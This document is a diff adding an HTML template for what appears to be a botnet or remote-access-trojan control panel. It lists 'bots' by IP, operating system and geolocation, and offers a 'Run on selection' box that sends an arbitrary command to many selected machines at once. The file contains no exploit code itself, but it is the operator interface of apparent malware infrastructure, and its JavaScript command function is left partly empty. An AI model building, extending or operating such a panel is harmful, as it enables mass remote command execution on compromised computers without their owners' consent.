@@ -1,0 +1,56 @@
+  {% with previous_page=url_for('webui.index'), title="Agent list" %}
+{% include "header.html" %}
+{% endwith %}
+
+<div class="container">
+  <section id="main_content">
+
+      <form method="post" action="{{ url_for('webui.mass_execute') }}">
+      <input type="text" name="cmd" id="cmd" style="width:50%" />
+      <input type="submit" name="execute" value="Run on selection" />
+      <input type="submit" name="delete" value="Delete selection" onclick="return confirm('Remove selected agents from list ?')"/>
+
+      <table>
+      <tr><th>Name</th><th>Last Online</th><th>IP</th><th>OS</th><th>Geolocation</th><th>Change name</th><th>Sel.</th></tr>
+      {% for agent in agents %}
+      <tr>
+        <td><a href="{{ url_for('webui.agent_detail', agent_id=agent.id) }}" style="text-decoration: none">{{agent.display_name}}</a>  </td>
+        <td>{% if agent.last_online %}{% if agent.is_online() %}ONLINE{%else%}{{agent.last_online.strftime('%Y/%m/%d %H:%M')}}{%endif%}{% endif %}</td>
+        <td>{{agent.remote_ip}}</td>
+        <td>{{agent.operating_system}}</td>
+        <td>{{agent.geolocation}}</td>
+        <td><a href="#" onclick="changeName('{{agent.id}}', '{{agent.display_name}}')" style="text-decoration: none">Change name</a></td>
+        <td><input type="checkbox" id="checkbox_{{agent.id}}" name="selection" value="{{agent.id}}" /></td>
+      {% endfor %}
+      </table>
+      </form>
+  </section>
+</div>
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>
+function changeName(agentid, name) {
+    var newname = prompt("New name", name);
+    $.post("{{ url_for('webui.rename_agent') }}", {'newname': newname, 'id': agentid}, function() {window.location.reload();});
+}
+
+function keypressed(e){
+    if(e.keyCode === 13){
+        send_command();
+    }
+    return false;
+}
+function send_command(e) {
+    if(!$(".botid:checked").length){
+      alert('Please select at least one bot !');
+      return;
+    }
+    $(".botid:checked").each(function(){
+      
+    });
+    $('#cmd').val('');
+    return false;
+}
+</script>
+
+{% include "footer.html" %}
